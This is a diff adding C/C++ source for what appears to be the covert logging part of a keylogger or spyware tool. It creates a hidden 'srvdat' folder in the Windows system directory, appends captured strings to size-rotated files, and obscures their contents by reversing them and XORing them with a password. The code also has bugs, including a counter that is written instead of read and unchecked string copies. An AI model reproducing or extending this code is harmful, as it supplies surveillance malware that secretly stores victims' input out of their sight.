@@ -1,0 +1,116 @@
+//inline HANDLE TargetFile();
+//char * BaseDirectory();
+//inline void WriteToFile(char *str);
+
+	//void WriteToFileLegacy(char *str);
+	//WriteToFileLegacy(str);
+	//WriteToFile(str);
+
+void WriteToFileLegacy(char *str)
+{
+	// get BaseDirectory
+	char *BaseDir = NULL;
+	auto char temp[STR_SZ1];
+	GetSystemDirectory(temp,STR_SZ1);
+	strcat(temp,"\\srvdat\\");
+	CreateDirectory(temp,NULL);
+	/* copy temp to BaseDir */
+	BaseDir = (char *) calloc
+		(strlen(temp)+1,1);
+	strcpy(BaseDir,temp);
+
+	// ok now write
+	static unsigned long int FileCount = 0;
+	FILE *CounterFileHandle = NULL;
+	auto char too[STR_SZ2];
+	sprintf(too,"%s%s",BaseDirectory(),LogCountFile);
+	CounterFileHandle = fopen(too,"r+b");
+	if((CounterFileHandle == NULL) || (FileCount == 0)) {
+		FileCount = 1;
+		CounterFileHandle = fopen(too,"w+b");
+		fwrite(&FileCount, sizeof(unsigned long int), 
+			1, CounterFileHandle);
+	} else {
+		fwrite(&FileCount, sizeof(unsigned long int), 
+			1, CounterFileHandle);
+	} rewind(CounterFileHandle);
+
+	auto char fname[STR_SZ2];
+	sprintf(fname,"%s%s",BaseDir,"x.txt");
+	ofstream lf(fname,ios::app);
+	lf.write(str,strlen(str));
+}
+
+char * BaseDirectory()
+{
+	static char *BaseDir = NULL;
+
+	/* not known? */
+	if(!BaseDir) {
+		// this code is executed ONLY ONCE
+		auto char temp[STR_SZ1];
+		GetSystemDirectory(temp,STR_SZ1);
+		strcat(temp,"\\srvdat\\");
+		CreateDirectory(temp,NULL);
+
+		/* copy temp to BaseDir */
+		BaseDir = (char *) calloc
+			(strlen(temp)+1,1);
+		strcpy(BaseDir,temp);
+	}
+
+	return BaseDir;
+}
+
+inline HANDLE TargetFile()
+{
+	static char TargetFileName[STR_SZ1];
+	static unsigned long int FileCount = 1;
+	static FILE *CounterFileHandle = NULL;
+
+	if(CounterFileHandle == NULL) {
+		// this code is executed ONLY ONCE
+		auto char temp[STR_SZ2];
+		sprintf(temp,"%s%s",BaseDirectory(),LogCountFile);
+		CounterFileHandle = fopen(temp,"r+b");
+		if(CounterFileHandle == NULL) {
+			CounterFileHandle = fopen(temp,"w+b");
+			fwrite(&FileCount, sizeof(unsigned long int), 
+				1, CounterFileHandle);
+		} else
+			fread(&FileCount,sizeof(unsigned long int), 
+				1, CounterFileHandle);
+		rewind(CounterFileHandle);
+	}
+	sprintf(TargetFileName,"%s%lX%s",BaseDirectory(),FileCount,LocLogFileExt);
+
+	/* grasp the file & its size*/
+	HANDLE hFile = CreateFile(TargetFileName, GENERIC_WRITE,
+	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if(hFile == INVALID_HANDLE_VALUE) return hFile;
+	DWORD FileSize = GetFileSize(hFile, NULL);
+	if(FileSize == INVALID_FILE_SIZE) return hFile;
+
+	if(FileSize > MAX_FSZ) {
+		FileCount++;
+		fwrite(&FileCount,sizeof(unsigned long int), 
+			1, CounterFileHandle);
+		rewind(CounterFileHandle);
+	}
+	return hFile;
+}
+
+inline void WriteToFile(char *str)
+{
+	HANDLE hFile;
+	DWORD  nFile;
+
+	if((hFile = TargetFile()) ==
+	INVALID_HANDLE_VALUE) return;
+
+	InvertArray(str,strlen(str));
+	XorArray(str,strlen(str),Password);
+	SetFilePointer(hFile, 0, NULL, FILE_END);
+	WriteFile(hFile, str, strlen(str), &nFile, NULL);
+	CloseHandle(hFile);
+}
